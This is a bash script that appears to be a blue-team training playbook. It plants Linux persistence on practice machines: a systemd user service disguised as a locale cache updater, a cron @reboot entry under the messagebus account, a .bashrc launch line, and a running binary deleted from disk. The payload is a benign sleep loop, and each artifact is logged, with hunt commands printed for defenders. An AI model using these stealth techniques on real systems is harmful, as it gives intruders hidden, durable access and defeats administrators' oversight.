#!/bin/bash
# lb1-stealth-persist.sh -- ADVANCED STEALTH PERSISTENCE playbook (Linux)
# Low-visibility locations to stress auditd baselines:
#   1. systemd user-scope timer (NO ROOT needed once any user shell exists)
#   2. cron @reboot under a service account's crontab
#   3. shell rc backdoor line + unlinked (deleted) binary that keeps running
# All ground truth -> ../ledger.jsonl. Practice boxes only.
set -u
MARKER="ccdc-pb1"
LEDGER="$(cd "$(dirname "$0")/.." && pwd)/ledger.jsonl"
STAGE="/usr/local/share/.cache"
BEACON="$STAGE/.locale"

ledger() { # step artifact
    printf '{"ts":"%s","playbook":"%s","step":"%s","artifact":"%s"}\n' \
        "$(date +%s)" "$MARKER" "$1" "$2" >> "$LEDGER"
}
[ "$(id -u)" -eq 0 ] || { echo "run as root"; exit 1; }
mkdir -p "$STAGE" && chmod 755 "$STAGE"

# ---- STEP 0: stage a benign payload at a dotfile-style path --------------
printf '#!/bin/sh\n# ccdc-pb1 benign payload\nwhile :; do sleep 60; done\n' > "$BEACON"
chmod 755 "$BEACON"
ledger "stage" "$BEACON"

# ---- STEP 1: systemd USER-scope timer (no root path; check ~/.config!) ---
U="${SUDO_USER:-root}"
HOMED="$(getent passwd "$U" | cut -d: -f6)"
mkdir -p "$HOMED/.config/systemd/user/default.target.wants"
cat > "$HOMED/.config/systemd/user/ccdc-pb1.service" <<EOF
[Unit]
Description=Locale cache update
[Service]
Type=simple
ExecStart=$BEACON
Restart=always
[Install]
WantedBy=default.target
EOF
ln -sf "$HOMED/.config/systemd/user/ccdc-pb1.service" \
       "$HOMED/.config/systemd/user/default.target.wants/ccdc-pb1.service"
ledger "systemd-user" "$HOMED/.config/systemd/user/ccdc-pb1.service"

# ---- STEP 2: cron @reboot under a service account -------------------------
CRONU="messagebus"                      # plausible service account
if getent passwd "$CRONU" >/dev/null; then
    ( crontab -u "$CRONU" -l 2>/dev/null | grep -v ccdc-pb1
      echo "@reboot $BEACON # ccdc-pb1" ) | crontab -u "$CRONU" -
    ledger "cron-reboot" "crontab:$CRONU"
fi

# ---- STEP 3: rc line + unlinked running binary ----------------------------
grep -q ccdc-pb1 "$HOMED/.bashrc" 2>/dev/null || \
    echo "nohup $BEACON >/dev/null 2>&1 & # ccdc-pb1" >> "$HOMED/.bashrc"
ledger "rc-line" "$HOMED/.bashrc"
cp "$BEACON" /tmp/.last && chmod 755 /tmp/.last
setsid /tmp/.last >/dev/null 2>&1 &
rm -f /tmp/.last
echo $! > /run/ccdc-pb1-unlinked.pid
ledger "unlinked-binary" "/proc/$(cat /run/ccdc-pb1-unlinked.pid)/exe"

echo "== lb1 planted. Hunt:"
echo "   find ~ -name '*.service' -path '*systemd/user*'   # user-scope units"
echo "   crontab -u messagebus -l                           # service-account cron"
echo "   ls -l /proc/*/exe | grep deleted                   # unlinked binary"
echo "   grep -r ccdc /home/*/.bashrc"
echo "cleanup: sudo ./lcleanup.sh"
